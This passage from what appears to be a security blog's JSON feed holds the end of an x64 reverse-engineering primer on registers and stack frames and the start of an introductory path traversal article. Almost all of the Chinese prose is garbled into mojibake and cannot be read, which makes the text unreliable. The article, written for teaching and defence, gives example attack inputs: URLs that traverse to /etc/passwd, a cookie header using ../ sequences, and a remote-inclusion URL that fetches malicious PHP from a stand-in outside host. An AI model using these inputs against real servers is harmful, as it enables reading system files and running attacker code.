bytesã€ç„¶å¾Œå†åˆ‡åˆ†ç‚º <code>ah</code> èˆ‡ <code>al</code>ã€‚</p>\n<p><figure><img src=\"/img/posts/crystal/reverse-01/reg-size.png\" /><figcaption><p>register sizes</p>\n</figcaption></figure></p>\n<p>æš«å­˜å™¨çš„ç¨®é¡ä¹Ÿéå¸¸å¤šï¼Œä¸€èˆ¬ä¾†èªªï¼Œæœ‰ 16 å€‹ä¸€èˆ¬ç”¨é€”æš«å­˜å™¨ï¼Œç‚º <code>rax</code> <code>rbx</code> <code>rcx</code> <code>rdx</code> <code>rdi</code> <code>rsi</code> <code>rbp</code> <code>rsp</code> <code>r8-r15</code>ï¼Œæ„æŒ‡å¯èƒ½è¢«ç”¨æ–¼ä»»ä½•é‹ç®—æ“ä½œã€‚èˆ‡ä¹‹ç›¸å°ï¼Œå±¬æ–¼ç‰¹æ®Šç”¨é€”æš«å­˜å™¨çš„ <code>rip</code> <code>rflags</code>å°±ä¸æ˜¯å¯ä»¥æ‹¿ä¾†é‹ç®—èª¿ç”¨çš„ã€‚</p>\n<p><figure><img src=\"/img/posts/crystal/reverse-01/x64-regs.png\" /><figcaption><p>x64 registersï¼Œä¾†è‡ª<a href=\"https://cs.brown.edu/courses/cs033/docs/guides/x64_cheatsheet.pdf\">å¸ƒæœ—å¤§å­¸è¬›ç¾©</a></p>\n</figcaption></figure></p>\n<p>æ¯å€‹æš«å­˜å™¨å‚³çµ±ä¸Šéƒ½æœ‰ç‰¹æ®Šç”¨é€”ï¼Œä¾‹å¦‚ï¼š</p>\n<ul>\n<li><code>rax</code> å¸¸ç”¨æ–¼æ”¾å‡½æ•¸å›å‚³å€¼è·Ÿä¹˜é™¤æ³•é‹ç®—çµæœ</li>\n<li><code>rbx</code> å¸¸ç”¨æ–¼æ”¾ base address</li>\n<li><code>rcx</code> å¸¸ç”¨æ–¼å›åœˆä¸­çš„è¨ˆæ•¸å™¨ï¼ˆcounterï¼‰</li>\n<li><code>rdx</code> å¸¸ç”¨æ–¼å­˜æ”¾è³‡æ–™</li>\n<li><code>rbp (base pointer)</code> æŒ‡å‘ç•¶å‰å‡½æ•¸ stack ä¸Šçš„åº•éƒ¨ï¼ˆstack frame ä¸‹ç·£ï¼‰</li>\n<li><code>rsp (stack pointer)</code> æŒ‡å‘ç•¶å‰å‡½æ•¸ stack ä¸Šçš„é ‚éƒ¨ï¼ˆstack frame ä¸Šç·£ï¼‰</li>\n<li><code>rip (instruction pointer)</code> æŒ‡å‘ä¸‹ä¸€å€‹è¦åŸ·è¡Œçš„ CPU æŒ‡ä»¤</li>\n</ul>\n<p>å†ä¾†ï¼Œæˆ‘å€‘çœ‹çœ‹ stack è·Ÿ heap ã€‚C ç¨‹å¼ä¸€èˆ¬çš„è¨˜æ†¶é«”é…ç½®å¦‚ä¸‹åœ–ã€‚ä¸Šé¢æ˜¯é«˜çš„è¨˜æ†¶é«”ä½å€ï¼ˆ<code>0xffffâ€¦</code>ï¼‰ä¸‹é¢æ˜¯ä½çš„è¨˜æ†¶é«”ä½å€ï¼ˆ<code>0x0000â€¦</code>ï¼‰ï¼Œheap åœ¨Â <code>.bss</code> å€æ®µä¹‹å¾Œé–‹å§‹ã€éš¨è‘—å‹•æ…‹è¨˜æ†¶é«”é…ç½®å¢åŠ æ…¢æ…¢å¾€ä¸Šé•·ï¼Œè€Œ stack å‰‡æ˜¯å¾é«˜çš„è¨˜æ†¶é«”ä½å€é–‹å§‹å¾€ä¸‹é•·ã€‚stack æ”¾ç½®çš„æ˜¯éœæ…‹çš„ã€å·²çŸ¥å¤§å°çš„è³‡æ–™ï¼Œä¾‹å¦‚æ¯ä¸€å€‹å‡½æ•¸å…§çš„å€åŸŸè®Šæ•¸ä»¥åŠå‡½æ•¸çš„åƒæ•¸è·Ÿåœ°å€ç­‰ç­‰ã€‚</p>\n<p><figure><img src=\"/img/posts/crystal/reverse-01/memory-layout.png\" /><figcaption><p>memory layoutï¼Œå–è‡ª <a href=\"https://www.geeksforgeeks.org/memory-layout-of-c-program/\">geekforgeeks</a></p>\n</figcaption></figure></p>\n<p>ç¨‹å¼åŸ·è¡Œæ™‚å‡½æ•¸çš„å‘¼å«å°±æœƒä»¥ stack frame çš„æ–¹å¼å±¤å±¤å †ç–Šï¼Œä¹Ÿå¯ä»¥æƒ³æˆè¨˜æ†¶é«”æ˜¯ä¸€å€‹ç›´ç«‹å¼çš„æ«ƒå­ã€æ¯å€‹å‡½æ•¸æ˜¯ä¸€æœ¬ä¸€æœ¬çš„æ›¸ç±ï¼Œè£¡é¢è¨˜è¼‰äº†é€™å€‹å‡½æ•¸å…§çš„å„ç¨®è®Šæ•¸ï¼Œç•¶ä¸€å€‹å‡½æ•¸è¢«å‘¼å«æ™‚ï¼Œå°±æŠŠé€™æœ¬æ›¸å¹³æ”¾åˆ°æ«ƒå­ä¸­æ›¸å †çš„æœ€ä¸Šé¢ï¼Œå®Œæˆå¾Œå†å¾æ›¸å †ä¸Šæ‹¿ä¸‹ä¾†ã€‚</p>\n<p>é‚£éº¼ï¼Œèª°å»ç®¡ç†é€™å€‹æ«ƒå­ä¸­çš„æ›¸å †ï¼Œç¢ºä¿æ›¸ç±æœ‰å¥½å¥½çš„è¢«å †ç–Šè·Ÿç§»é™¤å‘¢ï¼Ÿ</p>\n<p>ç®¡ç†å‡½æ•¸ä¹‹é–“åƒæ•¸å‚³éã€ä¸¦è¦å®šèª°è² è²¬æ¸…é™¤å †ç–Šçš„ä¸€å¥—ç´„å®šï¼Œæˆ‘å€‘ç¨±ç‚º calling convention ï¼Œæˆ–æ˜¯åœ‹å®¶æ•™è‚²ç ”ç©¶é™¢è­¯ç‚ºå‘¼å«ç´„å®šã€‚åœ¨ä¸åŒçš„ç³»çµ±æ¶æ§‹ä¸‹æœƒæœ‰ä¸åŒçš„ calling conventionï¼Œä»¥ AMD64 ç³»çµ±ï¼ˆç”¨æ–¼ Solarisã€Linuxã€FreeBSDã€MacOS ç­‰ Unix è·Ÿ Unix-like ç³»çµ±ï¼‰çš„ x86â€“64 ç‚ºä¾‹ï¼Œå„²å­˜å‡½æ•¸å‰å…­å€‹åƒæ•¸çš„æš«å­˜å™¨ä¾åºç‚º <code>rdi</code> <code>rsi</code> <code>rdx</code> <code>rcx</code> <code>r8</code> <code>r9</code>ï¼Œè€Œå‡½æ•¸ return çš„å›å‚³å€¼å‰‡æœƒæ”¾åœ¨ <code>rax</code> ä¸­ï¼ˆè‹¥å¤§æ–¼ä¸€å€‹æš«å­˜å™¨çš„ç©ºé–“ï¼Œä¾‹å¦‚å›å‚³å€¼åœ¨ 64â€“128 bitï¼Œå‰‡æœƒæ”¾åœ¨ <code>rax</code> è·Ÿ <code>rdx</code>ï¼‰ã€‚åœ¨å‘¼å«ä¸€å€‹å‡½æ•¸å‰ï¼Œå‘¼å«è€…ï¼ˆcallerï¼‰æœƒæŠŠè¢«å‘¼å«çš„å‡½æ•¸ï¼ˆcalleeï¼‰çš„åƒæ•¸æ”¾åˆ°æš«å­˜å™¨ä¸­ï¼Œå†é€é <code>call</code> é€™å€‹æŒ‡ä»¤å»åŸ·è¡Œ calleeã€‚è€Œé€²å…¥ callee å¾Œï¼Œåœ¨é€²è¡Œä¸»é‚è¼¯å‰ï¼Œcallee æœƒå…ˆå‰µé€ è‡ªå·±çš„ stack frameï¼Œåœ¨ stack ä¸Šç•™ä¸€å¡Šè¨˜æ†¶é«”ç©ºé–“ã€‚é‚è¼¯åŸ·è¡ŒçµæŸæ™‚ï¼Œç”¨ <code>leave</code> æŠŠ stack frame è£¡çš„æ±è¥¿æ¸…æ‰ï¼Œæœ€å¾Œ <code>ret</code> æŠŠæ§åˆ¶æ¬Šäº¤å› callerã€‚</p>\n<p>ã€å‰µé€ è‡ªå·±çš„ stack frameã€é€™å€‹å‹•ä½œåˆç¨±ç‚º function prologueï¼Œå¯ä»¥é¡æ¯”ç‚ºæ›¸çš„å‰è¨€ã€é‹ªæˆã€‚å¯¦ä½œä¸Šå…¶å¯¦æœ‰ä¸€å€‹çµ„èªæŒ‡ä»¤å« <code>enter n,0</code>ï¼Œä¸éå› ç‚ºä»–å¤ªæ…¢äº†ï¼Œæ‰€ä»¥é€šå¸¸ç”¨ä¸‹é¢é€™æ®µå–ä»£ï¼š</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">push  ebp<br>mov   ebp, esp     # ebp = esp<br>sub   esp,  $n     # allocate space on the stack</code></pre>\n<p>æ­é…ä¸‹åœ–ç”±å·¦è€Œå³ä¾†çœ‹ï¼Œè—è‰²å€å¡Šæ˜¯ caller çš„ stack frameï¼Œé»ƒè‰²æ˜¯é€²è¡Œ <code>call</code> å¾ŒæŠŠç•¶å‰åŸ·è¡Œåˆ°çš„åœ°æ–¹ï¼Œä¹Ÿå°±æ˜¯ç­‰ç­‰ callee çµæŸåŸ·è¡Œè¦è¿”å›çš„åœ°æ–¹çµ¦å­˜èµ·ä¾†ã€‚ç¬¬ä¸€è¡Œçš„ <code>push</code> æŠŠç•¶å‰çš„ <code>ebp</code> æ”¾åˆ° stack ä¸Šé¢ï¼Œç­‰åŒå­˜å¥½ç¾åœ¨çš„ stack åŸºåº•ï¼Œæ–¹ä¾¿å‡½æ•¸çµæŸå¾Œå›å¾©åˆ°å‰ä¸€å€‹å‡½æ•¸çš„ç‹€æ…‹ï¼Œæ­¤æ™‚ stack å¾å·¦ä¸€è®Šæˆå·¦äºŒï¼Œå¤šäº†ç¶ è‰²çš„éƒ¨åˆ†ã€‚ç¬¬äºŒè¡ŒæŠŠ <code>ebp</code> æŒ‡åˆ°ç¾åœ¨ <code>esp</code> çš„ä½ç½®ï¼Œstack å¾å·¦äºŒè®Šæˆå·¦ä¸‰ã€‚ç¬¬ä¸‰è¡ŒæŠŠ <code>esp</code> å‘ä¸Šç§»å¤§å°ç‚º n çš„ç©ºé–“ï¼Œä¹Ÿå°±æ˜¯é ç•™å‡º callee å‡½æ•¸æ‰€éœ€è¦çš„è¨˜æ†¶é«”ï¼Œstack è®Šæˆæœ€å¾Œä¸€å¼µï¼Œå‰µé€ å‡ºäº†ç´…è‰²éƒ¨åˆ†çš„å¦ä¸€å€‹ stack frameã€‚</p>\n<p><figure><img src=\"/img/posts/crystal/reverse-01/prologue.png\" /><figcaption><p>function prologue</p>\n</figcaption></figure></p>\n<p>ã€æ¸…æ‰è‡ªå·±çš„ stack frameã€é€™å€‹å‹•ä½œåˆç¨±ç‚º function epilogueï¼Œå¯ä»¥é¡æ¯”ç‚ºæ›¸çš„å¾Œè¨€ã€‚ä½¿ç”¨çš„çµ„èªæŒ‡ä»¤å« <code>leave</code>ï¼Œæ¦‚å¿µä¸Šç­‰åŒä¸‹é¢é€™æ®µï¼š</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">mov   esp, ebp     # esp = ebp<br>pop   ebp          # restore old ebp</code></pre>\n<p>æ­é…ä¸‹åœ–ç”±å·¦è€Œå³ä¾†çœ‹ï¼ŒåŸå§‹ç‹€æ…‹å°±æ˜¯å‰é¢ function prologue å®Œçš„æ¨£å­ã€‚ç¬¬ä¸€è¡ŒæŠŠ <code>esp</code> æŒ‡å› <code>ebp</code> çš„åœ°æ–¹ï¼Œstack å¾å·¦ä¸€è®Šæˆå·¦äºŒï¼Œé€™ä¸‹å­ç´…è‰²çš„ callee stack frame å°±è¢«é‡‹æ”¾å‡ºä¾†äº†ã€‚ç¬¬äºŒè¡ŒæŠŠ stack ä¸Šçš„å€¼æ‹¿ä¸‹ä¾†æ”¾å› <code>ebp</code>ï¼Œä¹Ÿå°±æ˜¯æŠŠèˆŠçš„ <code>ebp</code> ä½ç½®é‚„åŸå›ä¾†ï¼Œstack è®Šæˆæœ€å³é‚Šçš„æ¨£å­ï¼Œç•¶å‰çš„è¨˜æ†¶é«”æœ€ä¸Šé¢å°±å›åˆ° caller çš„ stack frame äº†ã€‚</p>\n<p><figure><img src=\"/img/posts/crystal/reverse-01/epilogue.png\" /><figcaption><p>function epilogue</p>\n</figcaption></figure></p>\n<hr>\n<h2 id=\"%E7%B5%90%E8%AA%9E\"><a class=\"direct-link\" href=\"#%E7%B5%90%E8%AA%9E\">#</a> çµèª</h2>\n<p>åˆ°é€™è£¡ç‚ºæ­¢ï¼Œæˆ‘å€‘å…¶å¯¦éƒ½é‚„æ²’é–‹å§‹é€†å‘å‘¢XDDD å…ˆå…·å‚™ä¸€äº›åŸºç¤çŸ¥è­˜æ˜¯å¾ˆé‡è¦çš„ï¼ŒçŸ¥å·±çŸ¥å½¼æ‰èƒ½è¦‹æ‹›æ‹†æ‹›å˜›ï¼</p>\n<p>é€™ä¸€ç¯‡æˆ‘å€‘å…ˆè¬›è§£äº†é€†å‘çš„èµ·æ‰‹å¼ã€åŸºæœ¬çš„çµ„åˆèªè¨€ä»¥åŠè¨ˆç®—æ©Ÿçµæ§‹ã€é‚„æœ‰ç·¨è­¯å®Œçš„ç¨‹å¼ç¢¼ä»¥åŠè¨˜æ†¶é«”çš„é‹ä½œæ–¹å¼ã€‚ä¸Šé¢åªæ˜¯é‡å°AMD çš„ x86â€“64 é€™ä¸€ç¨®çµæ§‹åšèªªæ˜ï¼Œæœ‰èˆˆè¶£çš„è©±å¯ä»¥å»æŸ¥æŸ¥ä¸åŒçµæ§‹ä¸‹çš„çµ„åˆèªè¨€æŒ‡ä»¤é›†è·Ÿ calling conventionï¼Œå¯æ˜¯å¾ˆä¸åŒçš„å–”ï¼ä½ ä¹Ÿå¯ä»¥æŠŠé€™ç¯‡ç”¨åˆ°çš„å°ç¨‹å¼è·Ÿä½ é›»è…¦ä¸Šåˆ¥çš„ç¨‹å¼ç”¨ GDB æˆ–æ˜¯ IDA æ‰“é–‹ä¾†çœ‹çœ‹ï¼Œæ¯”è¼ƒä¸€ä¸‹å·®ç•°ã€‚</p>\n<p>ç¸½ä¹‹ï¼Œæˆ‘å€‘ç¸½ç®—æŠŠå‰ç½®æº–å‚™å®Œæˆï¼Œä¸‹ä¸€é›†æˆ‘å€‘ä¾†æ­£å¼é–‹å§‹çœ‹ <code>main</code> ï¼</p>\n<hr class=\"footnotes-sep\">\n<section class=\"footnotes\">\n<ol class=\"footnotes-list\">\n<li id=\"fn1\" class=\"footnote-item\"><p>å°æé†’ï¼šåƒè¬åˆ¥åŸ·è¡Œä¾†è·¯ä¸æ˜çš„æª”æ¡ˆå“¦ï¼ä¸€èˆ¬ä¾†èªªæä¾›è»Ÿé«”çš„å» å•†éƒ½æœƒåœ¨ä¸‹è¼‰é»æä¾›ä¸€å€‹ MD5 checksumï¼Œä¹Ÿå°±æ˜¯å°‡é€™å€‹æª”æ¡ˆçš„è³‡æ–™åšé›œæ¹Šé‹ç®—å¾—å‡ºçš„ä¸€å€‹å€¼ï¼Œä½ å¯ä»¥åˆ©ç”¨ linux å…§å»ºçš„ <code>md5sum</code> æŒ‡ä»¤é©—æ˜æ­£èº«ï¼å¦‚æœ <code>md5sum &lt;file&gt;</code> çš„åˆ°çš„çµæœè·Ÿç¶²ç«™æ¨™ç¤ºçš„ä¸€æ¨£æ‰æ˜¯å°çš„ï¼ <a href=\"#fnref1\" class=\"footnote-backref\">â†©ï¸</a></p>\n</li>\n<li id=\"fn2\" class=\"footnote-item\"><p>åœ¨ dynamically linked çš„æ™‚å€™ï¼Œå¦‚æœæƒ³çœ‹åˆ°æœ‰å“ªäº›å¤–éƒ¨å‡½ç¤ºåº«è¢«èª¿ç”¨ï¼Œä»¥åŠä»–å€‘çš„ base addressï¼Œå¯ä»¥ç”¨ <code>ldd &lt;filename&gt;</code> æŸ¥çœ‹ï¼Œé€™éƒ¨åˆ†çš„åˆ©ç”¨ä»¥å¾Œæœ‰ pwn å…¥é–€ç³»åˆ—å†ä¾†èªªæ˜ XDD <a href=\"#fnref2\" class=\"footnote-backref\">â†©ï¸</a></p>\n</li>\n<li id=\"fn3\" class=\"footnote-item\"><p>æˆ–è€…æˆ‘å€‘ä¹Ÿå¯ä»¥ç”¨ <code>objdump</code> ä¾†çœ‹å„å€æ®µçš„ä½ç½®ä»¥åŠæ¬Šé™ï¼ŒæŒ‡ä»¤ç‚º <code>objdump -h &lt;filename&gt;</code>ï¼ŒåŒä¸€å€‹æª”æ¡ˆçš„è¼¸å‡ºæœƒé•·é€™æ¨£ <a href=\"#fnref3\" class=\"footnote-backref\">â†©ï¸</a></p>\n</li>\n<li id=\"fn4\" class=\"footnote-item\"><p>æŒ‡ä»¤é›†ï¼š<a href=\"https://software.intel.com/content/www/us/en/develop/articles/intel-sdm.html\">Intel 64 &amp; 32 bits</a>ã€<a href=\"https://en.wikipedia.org/wiki/X86_instruction_listings\">ç¶­åŸºç™¾ç§‘</a>ã€<a href=\"https://cs.brown.edu/courses/cs033/docs/guides/x64_cheatsheet.pdf\">x64 cheat sheet</a> <a href=\"#fnref4\" class=\"footnote-backref\">â†©ï¸</a></p>\n</li>\n<li id=\"fn5\" class=\"footnote-item\"><p>å¦å¤–å…¶å¯¦æœ‰ 128 bit çš„æš«å­˜å™¨ï¼Œä¾‹å¦‚ç”¨ä¾†å‚³éæµ®é»æ•¸çš„åƒæ•¸æ™‚ä½¿ç”¨çš„æ˜¯ <code>XMM</code> ç³»åˆ—ï¼Œcalling convention è·Ÿä¸€èˆ¬ç”¨é€”æš«å­˜å™¨é¡ä¼¼ï¼Œ<code>XMM0-XMM7</code> ç”¨æ–¼å‚³éåƒæ•¸ï¼Œå›å‚³å€¼å‰‡æœƒæ”¾åœ¨ <code>XMM0</code></p>\n<p><figure><img src=\"/img/posts/crystal/reverse-01/objdump.png\" /><figcaption><p>objdump output</p>\n</figcaption></figure> <a href=\"#fnref5\" class=\"footnote-backref\">â†©ï¸</a></p>\n</li>\n</ol>\n</section>\n",
      "date_published": "2021-06-04T08:00:00+08:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/jo/zerobased-path-traversal/",
      "url": "https://tech-blog.cymetrics.io/posts/jo/zerobased-path-traversal/",
      "title": "é›¶åŸºç¤è³‡å®‰ç³»åˆ—ï¼ˆäº”ï¼‰-è·¯å¾‘éæ­·ï¼ˆPath Traversalï¼‰",
      "content_html": "<!-- summary -->\n<h2 id=\"%E5%89%8D%E8%A8%80\"><a class=\"direct-link\" href=\"#%E5%89%8D%E8%A8%80\">#</a> å‰è¨€</h2>\n<blockquote>\n<p>è·¯å¾‘éæ­·ï¼ˆPath Traversalï¼‰å°±åƒæƒ³åƒç¶²ç«™æ˜¯ä¸€å€‹åšç‰©é¤¨ï¼Œè£¡é¢æœ‰è¨±å¤šæˆ¿é–“ï¼Œå…¶ä¸­æœ‰äº›æˆ¿é–“æ˜¯ Staff Only è€Œä¸”é–€ä¸Šäº†é–ä¸è®“è¨ªå®¢é€²å…¥ï¼Œä½†æœ‰è¶£çš„æ˜¯åšç‰©é¤¨è£¡çš„æ¯ä¸€å€‹æˆ¿é–“éƒ½æœ‰é€šé¢¨å£ï¼Œåªè¦çŸ¥é“æˆ¿é–“ä½ç½®ï¼Œå°±å¯ä»¥é€éå…¶ä»–æˆ¿é–“çš„é€šé¢¨å£å‰å¾€ Staff Only çš„æˆ¿é–“ç²å¾—æ‰€æœ‰ä½ æƒ³è¦çš„è³‡æ–™ã€‚</p>\n</blockquote>\n<!-- summary -->\n<h2 id=\"%E9%87%8B%E4%BE%8B\"><a class=\"direct-link\" href=\"#%E9%87%8B%E4%BE%8B\">#</a> é‡‹ä¾‹</h2>\n<p>ä»Šå¤©æƒ³å’Œå¤§å®¶èŠèŠåœ¨ç¶²ç«™å®‰å…¨ä¸Šæ”»æ“Šè€…å®¹æ˜“åŸ·è¡Œä½†å»å¸¸è¢«é–‹ç™¼è€…å¿½ç•¥çš„è·¯å¾‘éæ­·ï¼ˆPath Traversalï¼‰æ”»æ“Šï¼Œè«‡è«‡é—œæ–¼è·¯å¾‘éæ­·åœ¨ç¶²ç«™å®‰å…¨ä¸Šå¯èƒ½é€ æˆçš„é¢¨éšªä»¥åŠå¦‚ä½•é é˜²ã€‚</p>\n<p>é€šå¸¸è·¯å¾‘éæ­·ä¹Ÿè¢«ç¨±ç›®éŒ„éæ­·ï¼ˆDirectory Traversalï¼‰ï¼Œä½†ä»–æœ‰å€‹æ›´å…·é«”è€Œä¸”è »å¯æ„›çš„åå­—å«åšé»é»æ–œç·šæ”»æ“Šï¼ˆDot dot slash attackï¼‰ï¼Œé‚£ç‚ºä»€éº¼æœƒå«é€™å€‹åå­—å‘¢ï¼Ÿ</p>\n<p>èˆ‰å€‹å¯¦éš›çš„ä¾‹å­ï¼ŒLinux ä¸­ï¼Œç›®éŒ„çš„é¡¯ç¤ºæ˜¯ / Users / hello / Desktop / fileï¼Œå¦‚æœä½¿ç”¨è€…è¼¸å…¥ cdÂ ../ æŒ‡ä»¤æ™‚ï¼Œç•¶å‰çš„ç›®éŒ„å°±æœƒå›åˆ°ä¸Šä¸€å±¤ï¼Œé‚£é€™æœƒæœ‰ä»€éº¼å•é¡Œï¼Ÿç•¶é€™å€‹æŒ‡ä»¤æ˜¯ä»»ä¸€ä½¿ç”¨è€…æ¸¬è©¦åœ¨ç¶²ç«™ URL ä¸Šè¼¸å…¥Â ../ éƒ½å¯ä»¥æˆåŠŸåŸ·è¡Œå›åˆ°ç¶²ç«™ç›®éŒ„ä¸Šä¸€å±¤çš„æ™‚å€™å•é¡Œå°±å¤§æ¢äº†ï¼Œé€™è¡¨ç¤ºå‘Šè¨´æ”»æ“Šè€…ï¼Œæˆ‘æœ‰è·¯å¾‘éæ­·çš„é¢¨éšªï¼Œä½ å¯ä»¥é–‹å§‹å˜—è©¦å›‰ï¼</p>\n<h2 id=\"%E5%B8%B8%E8%A6%8B%E7%9A%84%E8%B7%AF%E5%BE%91%E9%81%8D%E6%AD%B7%E6%94%BB%E6%93%8A%E6%89%8B%E6%B3%95\"><a class=\"direct-link\" href=\"#%E5%B8%B8%E8%A6%8B%E7%9A%84%E8%B7%AF%E5%BE%91%E9%81%8D%E6%AD%B7%E6%94%BB%E6%93%8A%E6%89%8B%E6%B3%95\">#</a> å¸¸è¦‹çš„è·¯å¾‘éæ­·æ”»æ“Šæ‰‹æ³•</h2>\n<p>ä»¥ä¸‹æ‹¿å¹¾å€‹è·¯å¾‘éæ­·çš„æ”»æ“Šå¸¸è¦‹çš„ç¯„ä¾‹ä¾†èªªæ˜ï¼š</p>\n<p>å‡è¨­ç¶²å€å‘ˆç¾çš„æ–¹å¼ç‚ºï¼š</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">https://www.example.com/get-files?file=report.pdf</code></pre>\n<p>è€Œæ”»æ“Šè€…åœ¨çœŸæ­£çš„åŸ·è¡Œè·¯å¾‘éæ­·æ”»æ“Šä»¥å‰ï¼Œå¸¸æœƒä½¿ç”¨çµ•å°è·¯å¾‘éæ­·çš„æ‰‹æ³•æ¢æ¸¬ç›®æ¨™ç¶²ç«™çš„ç¶²ç«™æ¶æ§‹ï¼Œä¾‹å¦‚èªªï¼š</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">https://www.example.com/get-files?file=/etc/passwd</code></pre>\n<p>ï¼Œå˜—è©¦ä»¥å¸¸ç”¨çš„ç³»çµ±çµ•å°è·¯å¾‘è©¦æ¢æ˜¯å¦æœ‰å›æ‡‰ç•¶ï¼Œç•¶ä¼ºæœå™¨å›æ‡‰æœ‰é—œç¶²ç«™æ‡‰ç”¨ç¨‹åºä¸­çš„éŒ¯èª¤çš„ä¿¡æ¯æ™‚ï¼Œæ”»æ“Šè€…å¯ä»¥æ›´å®¹æ˜“çŒœæ¸¬æ­£ç¢ºçš„ä½ç½®ï¼ˆä¾‹å¦‚é¡¯ç¤ºåŸå§‹ç¢¼çš„æ–‡ä»¶è·¯å¾‘ï¼‰ã€‚</p>\n<h3 id=\"1.%E6%94%BB%E6%93%8A%E8%80%85%E5%98%97%E8%A9%A6%E8%A8%AA%E5%95%8F%E7%9B%AE%E9%8C%84%E5%A4%96%E7%9A%84%E8%B7%AF%E5%BE%91%EF%BC%9A\"><a class=\"direct-link\" href=\"#1.%E6%94%BB%E6%93%8A%E8%80%85%E5%98%97%E8%A9%A6%E8%A8%AA%E5%95%8F%E7%9B%AE%E9%8C%84%E5%A4%96%E7%9A%84%E8%B7%AF%E5%BE%91%EF%BC%9A\">#</a> 1.æ”»æ“Šè€…å˜—è©¦è¨ªå•ç›®éŒ„å¤–çš„è·¯å¾‘ï¼š</h3>\n<pre class=\"language-txt\"><code class=\"language-txt\">https://www.example.com/../../../../some dir/some file</code></pre>\n<p>æ”»æ“Šè€…è—‰ç”±å¤šæ¬¡çš„ ../ ä¾†è¶…è„«ç•¶å‰çš„ç›®éŒ„ï¼Œè¨ªå•ä¸åœ¨ç›®éŒ„ä¸‹çš„è³‡æ–™ã€‚</p>\n<h3 id=\"2.%E6%94%BB%E6%93%8A%E8%80%85%E5%98%97%E8%A9%A6%E8%AE%80%E5%8F%96%E7%9B%AE%E9%8C%84%E4%B8%AD%E7%9A%84%E7%B3%BB%E7%B5%B1%E6%AA%94%E6%A1%88\"><a class=\"direct-link\" href=\"#2.%E6%94%BB%E6%93%8A%E8%80%85%E5%98%97%E8%A9%A6%E8%AE%80%E5%8F%96%E7%9B%AE%E9%8C%84%E4%B8%AD%E7%9A%84%E7%B3%BB%E7%B5%B1%E6%AA%94%E6%A1%88\">#</a> 2.æ”»æ“Šè€…å˜—è©¦è®€å–ç›®éŒ„ä¸­çš„ç³»çµ±æª”æ¡ˆ</h3>\n<pre class=\"language-txt\"><code class=\"language-txt\">https://www.example.com/get-files?file=/etc/passwd</code></pre>\n<p>æ”»æ“Šè€…è—‰ç”± /etc/passwd ä¾†å˜—è©¦ç›´æ¥è®€å–ç³»çµ±æª”æ¡ˆï¼Œå¦‚æœçœŸçš„è¢«æ”»æ“Šè€…è®€å–åˆ° /etc/passwd æª”çš„è©±ï¼Œæ”»æ“Šè€…å¾ˆæœ‰å¯èƒ½è—‰æ­¤è§£è®€ root user çš„å¯†ç¢¼ï¼Œå¦å¤–ï¼Œå€¼å¾—ä¸€æçš„æ˜¯ï¼Œå¦‚æœç¶²ç«™æ¶åœ¨ Windows çš„ç³»çµ±ä¸­çš„è©±ï¼Œæ”»æ“Šè€…åªèƒ½è¨ªå•Webæ ¹ç›®éŒ„æ‰€åœ¨çš„ç£ç¢Ÿåˆ†å€ï¼Œä½†å¦‚æœæ˜¯åœ¨ Linux ç³»çµ±ä¸­çš„è©±ï¼Œæ”»æ“Šè€…å‰‡å¯ä»¥è¨ªå•æ•´å€‹ç£ç¢Ÿã€‚</p>\n<h3 id=\"3.%E6%94%BB%E6%93%8A%E8%80%85%E5%98%97%E8%A9%A6%E4%BD%BF%E7%B6%B2%E7%AB%99%E5%BC%95%E7%94%A8%E5%A4%96%E9%83%A8%E6%96%87%E4%BB%B6%E6%88%96%E8%85%B3%E6%9C%AC\"><a class=\"direct-link\" href=\"#3.%E6%94%BB%E6%93%8A%E8%80%85%E5%98%97%E8%A9%A6%E4%BD%BF%E7%B6%B2%E7%AB%99%E5%BC%95%E7%94%A8%E5%A4%96%E9%83%A8%E6%96%87%E4%BB%B6%E6%88%96%E8%85%B3%E6%9C%AC\">#</a> 3.æ”»æ“Šè€…å˜—è©¦ä½¿ç¶²ç«™å¼•ç”¨å¤–éƒ¨æ–‡ä»¶æˆ–è…³æœ¬</h3>\n<pre class=\"language-txt\"><code class=\"language-txt\">https://www.example.com/get-files?file=http://other-site.com/malicius-code.php</code></pre>\n<p>æ”»æ“Šè€…è—‰ç”±å˜—è©¦å°‡å…¶ä»–ç¶²ç«™ä¸­çš„æ–‡ä»¶åŒ…å«åˆ°ç•¶å‰ç¶²ç«™çš„ç›®éŒ„ï¼Œè®“ç³»çµ±å»å¼•ç”¨æ”»æ“Šè€…çš„æƒ¡æ„å¤–éƒ¨æ–‡ä»¶æˆ–è…³æœ¬ï¼Œé€²è€Œé”åˆ°ææ¬Šæˆ–æ˜¯ç«Šå–æ©Ÿæ•è³‡æ–™çš„ç›®çš„ã€‚</p>\n<h3 id=\"4.%E6%94%BB%E6%93%8A%E8%80%85%E4%BB%A5%E7%AB%84%E6%94%B9-http-%E7%9A%84%E8%AB%8B%E6%B1%82%E8%97%89%E6%AD%A4%E5%B0%8D%E4%BC%BA%E6%9C%8D%E5%99%A8%E7%99%BC%E8%B5%B7%E6%94%BB%E6%93%8A\"><a class=\"direct-link\" href=\"#4.%E6%94%BB%E6%93%8A%E8%80%85%E4%BB%A5%E7%AB%84%E6%94%B9-http-%E7%9A%84%E8%AB%8B%E6%B1%82%E8%97%89%E6%AD%A4%E5%B0%8D%E4%BC%BA%E6%9C%8D%E5%99%A8%E7%99%BC%E8%B5%B7%E6%94%BB%E6%93%8A\">#</a> 4.æ”»æ“Šè€…ä»¥ç«„æ”¹ HTTP çš„è«‹æ±‚è—‰æ­¤å°ä¼ºæœå™¨ç™¼èµ·æ”»æ“Š</h3>\n<pre class=\"language-txt\"><code class=\"language-txt\">GET /vulnerable.php HTTP/1.0   <br>Cookie: TEMPLATE=../../../../../../../../../etc/passwd</code></pre>\n<p>èˆ‡ä¸Šåˆ—ä¸åŒçš„æ˜¯æ”»æ“Šè€…ä¸æ˜¯ç¶“ç”±ç«„æ”¹ URL è€Œé”æˆè·¯å¾‘éæ­·çš„æ”»æ“Šï¼Œè€Œæ˜¯è—‰ç”±ç«„æ”¹ HTTP çš„è«‹æ±‚ä»¥å¤šæ¬¡çš„../ä¾†è¶…è„«ç•¶å‰ç¶²ç«™çš„ç›®éŒ„ï¼Œä½¿ä¼ºæœå™¨å›æ‡‰å‚³é€ etc/passwd è§£è®€ root user çš„å¯†ç¢¼ã€‚</p>\n<h2 